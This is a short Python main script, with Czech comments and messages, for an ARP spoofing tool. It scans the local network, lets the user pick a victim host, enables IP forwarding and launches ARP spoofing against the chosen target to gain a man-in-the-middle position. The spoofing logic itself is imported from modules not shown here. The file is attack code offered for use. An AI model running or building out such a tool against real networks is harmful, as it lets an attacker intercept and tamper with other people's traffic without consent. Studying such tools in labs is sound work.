# main.py
from network_utils import scan_network, select_target, toggle_forwarding
from spoofer_logic import spoof

def main():
    # 1. Sken sítě
    print("[*] Skenuji síť...\n")
    scan_network()

    # 2. Výběr oběti
    target_ip, target_mac = select_target()
    if not target_ip:
        print("[-] Nepodařilo se vybrat cíl. Ukončuji.")
        return

    # 3. Zapnutí IP forwardingu
    print("\n[+] Zapínám IP forwarding...")
    toggle_forwarding(True)

    # 4. Spuštění ARP spoofingu
    print("\n[*] Spouštím ARP spoof...\n")
    spoof(target_ip, target_mac)

if __name__ == "__main__":
    main()